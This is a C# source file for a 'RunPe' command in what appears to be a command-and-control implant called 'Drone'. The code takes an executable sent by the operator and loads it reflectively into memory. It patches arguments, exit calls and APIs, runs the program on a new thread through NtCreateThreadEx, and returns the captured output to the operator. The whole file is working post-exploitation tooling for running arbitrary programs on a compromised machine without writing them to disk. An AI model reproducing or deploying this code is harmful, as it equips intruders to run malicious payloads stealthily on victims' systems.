using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Interop;
using Drone.Utilities.PELoader;

namespace Drone.Commands;

public class RunPe : DroneCommand
{
    public override byte Command => 0x39;
    public override bool Threaded => true;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (IntPtr.Size != 8)
        {
            await Drone.SendTaskError(task.Id, "x64 only");
            return;
        }
        
        var peMapper = new PeMapper();
        peMapper.MapPEIntoMemory(task.Artefact, out var pe, out var currentBase);
        
        var importResolver = new ImportResolver();
        importResolver.ResolveImports(pe, currentBase);
        
        peMapper.SetPagePermissions();
        
        var argumentHandler = new ArgumentHandler();
        var filePath = $"{Directory.GetCurrentDirectory()}\\{Helpers.GenerateRandomString(7)}.exe";
        
        if (!argumentHandler.UpdateArgs(filePath, task.Arguments["args"]))
        {
            await Drone.SendTaskError(task.Id, "Failed to patch arguments");
            return;
        }
        
        var fileDescriptorRedirector = new FileDescriptorRedirector();
        if (!fileDescriptorRedirector.RedirectFileDescriptors())
        {
            await Drone.SendTaskError(task.Id, "Unable to redirect file descriptors");
            return;
        }
        
        var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
        extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();
        
        var extraAPIPatcher = new ExtraAPIPatcher();
        if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
        {
            await Drone.SendTaskError(task.Id, "Failed to patch APIs");
            return;
        }
        
        var exitPatcher = new ExitPatcher();
        if (!exitPatcher.PatchExit())
        {
            await Drone.SendTaskError(task.Id, "Failed to patch exit calls");
            return;
        }
        
        fileDescriptorRedirector.StartReadFromPipe();
        
        StartExecution(pe, currentBase);
        
        // Revert changes
        exitPatcher.ResetExitFunctions();
        extraAPIPatcher.RevertAPIs();
        extraEnvironmentalPatcher.RevertExtraPatches();
        fileDescriptorRedirector.ResetFileDescriptors();
        argumentHandler.ResetArgs();
        peMapper.ClearPE();
        importResolver.ResetImports();

        // Print the output
        var output = fileDescriptorRedirector.ReadDescriptorOutput();
        await Drone.SendTaskOutput(task.Id, output);
    }
    
    private static void StartExecution(PeLoader pe, long currentBase)
    {
        try
        {
            var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);

            var hThread = IntPtr.Zero;

            Methods.NtCreateThreadEx(
                new IntPtr(-1),
                threadStart,
                ref hThread);

            Methods.WaitForSingleObject(hThread, 30000);
        }
        catch
        {
            // bit pointless as this is usually fatal
        }
    }
}